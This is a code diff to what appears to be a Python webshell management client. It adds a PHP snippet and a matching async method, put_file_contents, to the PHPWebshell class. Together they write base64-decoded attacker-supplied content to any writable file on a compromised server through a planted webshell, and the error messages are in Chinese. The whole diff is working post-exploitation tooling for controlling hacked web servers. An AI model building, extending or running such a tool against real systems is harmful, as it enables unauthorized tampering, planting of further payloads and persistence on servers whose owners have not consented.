@@ -72,6 +72,20 @@ else if(filesize($filePath) > MAX_SIZE) {
 }
 """
 
+PUT_FILE_CONTENT_PHP = """
+$filePath = FILE_PATH;
+$fileContent = base64_decode(FILE_CONTENT);
+if(!is_file($filePath)) {
+    echo "WRONG_NOT_FILE";
+}
+else if(!is_writeable($filePath)) {
+    echo "WRONG_NO_PERMISSION";
+}else{
+    $content = file_put_contents($filePath, $fileContent);
+    echo "SUCCESS";
+}
+"""
+
 MOVE_FILE_PHP = """
 $filePath = #FILEPATH#;
 $newFilePath = #NEW_FILEPATH#;
@@ -345,6 +359,19 @@ class PHPWebshell(PHPSessionInterface):
         if result == "WRONG_FILE_TOO_LARGE":
             raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
         return base64.b64decode(result)
+
+    async def put_file_contents(
+        self, filepath: str, content: bytes
+    ) -> bool:
+        php_code = PUT_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
+            "FILE_CONTENT", repr(base64_encode(content))
+        )
+        result = await self.submit(php_code)
+        if result == "WRONG_NOT_FILE":
+            raise exceptions.FileError("目标不是一个文件")
+        if result == "WRONG_NO_PERMISSION":
+            raise exceptions.FileError("没有权限保存这个文件")
+        return result == "SUCCESS"
 
     async def move_file(self, filepath: str, new_filepath: str) -> None:
         php_code = MOVE_FILE_PHP.replace("#FILEPATH#", repr(filepath)).replace(
